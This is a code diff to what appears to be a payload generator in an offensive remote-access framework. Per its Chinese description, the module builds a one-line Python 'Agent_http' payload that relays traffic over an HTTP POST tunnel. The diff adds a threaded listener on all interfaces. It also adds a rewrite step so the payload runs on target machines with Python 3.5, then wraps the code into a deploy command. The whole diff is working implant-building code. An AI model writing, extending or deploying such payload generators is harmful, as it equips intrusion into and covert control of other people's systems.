@@ -9,6 +9,7 @@ import secrets
 
 from server.core.bootstrap import deploy_command
 from server.transports.agent_base import relay_code
+from server.core.pycompat import downgrade_py35
 
 MODULE = {
     "desc": "生成 Agent_http 一句话 python 载荷(HTTP POST 明文隧道中继)",
@@ -27,7 +28,7 @@ _DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "output")
 
 _LISTEN_CODE = '''\
-import http.server as _hs
+import http.server as _hs,socketserver as _ss
 class _H(_hs.BaseHTTPRequestHandler):
  protocol_version="HTTP/1.1"
  def log_message(s,*a):
@@ -56,8 +57,10 @@ class _H(_hs.BaseHTTPRequestHandler):
   s.end_headers()
   try:s.wfile.write(out)
   except:pass
+class _THS(_ss.ThreadingMixIn,_hs.HTTPServer):
+ daemon_threads=True
 def run():
- httpd=_hs.ThreadingHTTPServer(("0.0.0.0",_LP),_H)
+ httpd=_THS(("0.0.0.0",_LP),_H)
  httpd.serve_forever()
 run()
 '''
@@ -99,6 +102,7 @@ def run(host, port, server_key_hex=None, out_dir=None, agent_id=None):
                       str(list(agent_key)).replace(" ", ""),
                       host, port, via, long_lived=False)
     code += _LISTEN_CODE.replace("_LP", str(listen_port))
+    code = downgrade_py35(code)   # 目标机 py3.5: f-string → str.format
     compile(code, "<agent_http>", "exec")  # 生成即校验
 
     command = deploy_command(code)
